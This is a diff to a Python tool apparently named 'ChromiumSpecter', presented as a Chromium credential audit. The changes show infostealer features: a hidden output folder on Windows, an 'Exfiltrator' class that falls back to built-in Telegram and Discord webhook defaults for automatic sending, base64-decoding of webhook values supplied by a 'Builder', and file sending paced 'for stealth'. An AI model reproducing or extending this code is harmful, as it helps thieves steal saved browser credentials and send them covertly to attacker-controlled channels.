@@ -54,25 +54,44 @@ def _get_base_dir() -> Path:
         return Path(sys.executable).parent
     return Path(__file__).parent
 
-def _setup_environment(output_path: str):
+def _setup_environment(output_path: str, start_logging: bool = False):
     base = _get_base_dir()
     out_dir = base / output_path
+    
+    # Asegurar directorio
     for candidate in (out_dir, Path(os.environ.get('APPDATA', os.getcwd())) / output_path):
         try:
             candidate.mkdir(exist_ok=True, parents=True)
-            existing = ctypes.windll.kernel32.GetFileAttributesW(str(candidate))
-            if existing != 0xFFFFFFFF:
-                ctypes.windll.kernel32.SetFileAttributesW(str(candidate), existing | 0x2)
-            log_file = candidate / "pentest_audit.log"
-            handlers = [logging.FileHandler(log_file, encoding='utf-8')]
+            # Intentar ocultar en Windows
             try:
-                if sys.stdout and sys.stdout.isatty():
-                    handlers.append(logging.StreamHandler(sys.stdout))
+                existing = ctypes.windll.kernel32.GetFileAttributesW(str(candidate))
+                if existing != 0xFFFFFFFF:
+                    ctypes.windll.kernel32.SetFileAttributesW(str(candidate), existing | 0x2)
             except: pass
-            logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s', handlers=handlers)
+
+            if start_logging:
+                log_file = candidate / "pentest_audit.log"
+                # Limpiar handlers previos para evitar duplicados o bloqueos
+                root = logging.getLogger()
+                for handler in root.handlers[:]:
+                    root.removeHandler(handler)
+                
+                handlers = [logging.FileHandler(log_file, encoding='utf-8')]
+                try:
+                    if sys.stdout and sys.stdout.isatty():
+                        handlers.append(logging.StreamHandler(sys.stdout))
+                except: pass
+                logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s', handlers=handlers)
+            
             return candidate
         except: continue
     return out_dir
+
+def shutdown_logging():
+    root = logging.getLogger()
+    for handler in root.handlers[:]:
+        handler.close()
+        root.removeHandler(handler)
 
 logger = logging.getLogger("AuditorCore")
 
@@ -135,7 +154,7 @@ HTML_TEMPLATE = """
 </head>
 <body>
     <div class="container">
-        <h1>Auditoría de Credenciales Chromium</h1>
+        <h1>ChromiumSpecter — Auditoría Táctica de Credenciales</h1>
         <div style="background:#f8f9fa; border-left:4px solid #3498db; padding:12px 16px; margin-bottom:16px; font-size:0.92em; border-radius:0 4px 4px 0;">
             <strong>Metadatos del Reporte</strong><br>
             Fecha: <b>{{date}}</b> &nbsp;|&nbsp; Host: <b>{{hostname}}</b> &nbsp;|&nbsp; Usuario: <b>{{username}}</b> &nbsp;|&nbsp; PID: <b>{{pid}}</b> &nbsp;|&nbsp; Versión: <b>{{version}}</b><br>
@@ -164,10 +183,22 @@ def retry_request(func):
 
 class Exfiltrator:
     def __init__(self, telegram_token=None, telegram_chat_id=None, discord_webhook=None, timeout=None):
-        self.tg_token = telegram_token
-        self.tg_id    = telegram_chat_id
-        self.ds_hook  = discord_webhook
+        # Fallback a CONFIG si no se pasan parámetros (para auto-exfiltración con defaults)
+        self.tg_token = telegram_token if telegram_token else CONFIG["tg_token"]
+        self.tg_id    = telegram_chat_id if telegram_chat_id else CONFIG["tg_chat_id"]
+        self.ds_hook  = discord_webhook if discord_webhook else CONFIG["ds_webhook"]
         self.timeout  = timeout if timeout is not None else CONFIG["webhook_timeout"]
+
+        # Si vienen codificados (desde el Builder), decodificarlos
+        if self.tg_token and ":" not in self.tg_token: 
+            try: self.tg_token = safe_b64_decode(self.tg_token)
+            except: pass
+        if self.tg_id and not self.tg_id.startswith(("-", "1", "2", "3", "4", "5", "6", "7", "8", "9")):
+            try: self.tg_id = safe_b64_decode(self.tg_id)
+            except: pass
+        if self.ds_hook and not self.ds_hook.startswith("http"):
+            try: self.ds_hook = safe_b64_decode(self.ds_hook)
+            except: pass
 
     def send_files(self, file_paths):
         """Sends files with an optional inter-file delay for stealth."""
